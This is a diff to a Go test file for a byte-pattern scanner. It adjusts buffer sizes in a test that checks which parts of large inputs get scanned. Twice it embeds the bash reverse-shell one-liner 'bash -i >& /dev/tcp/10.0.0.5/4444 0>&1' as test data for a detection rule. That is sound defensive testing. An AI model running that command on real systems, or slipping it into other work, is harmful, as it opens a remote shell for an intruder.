@@ -173,7 +173,7 @@ func TestByteDeterminism(t *testing.T) {
 
 func TestByteHugeInputIsBounded(t *testing.T) {
 	set := mustBuiltinBytes(t)
-	big := bytes.Repeat([]byte("A"), InspectMaxBytes)
+	big := bytes.Repeat([]byte("A"), scaleN(InspectMaxBytes, 8<<20))
 	start := time.Now()
 	hits, trunc := set.Scan(context.Background(), InspectKindFile, big)
 	if !trunc {
@@ -186,8 +186,8 @@ func TestByteHugeInputIsBounded(t *testing.T) {
 		t.Fatalf("scan of max input took %v", d)
 	}
 	// content beyond the head/tail windows is not scanned (documented limit)
-	mid := bytes.Repeat([]byte("."), 16<<20)
-	copy(mid[8<<20:], "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
+	mid := bytes.Repeat([]byte("."), scaleN(16<<20, 8<<20))
+	copy(mid[len(mid)/2:], "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
 	hits, _ = set.Scan(context.Background(), InspectKindScript, mid)
 	for _, h := range hits {
 		if h.Rule.ID == "byte-revshell-bash-devtcp" {
@@ -195,7 +195,7 @@ func TestByteHugeInputIsBounded(t *testing.T) {
 		}
 	}
 	// content in the tail window is found
-	tail := bytes.Repeat([]byte("."), 16<<20)
+	tail := bytes.Repeat([]byte("."), scaleN(16<<20, 8<<20))
 	copy(tail[len(tail)-1024:], "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
 	hits, _ = set.Scan(context.Background(), InspectKindScript, tail)
 	found := false
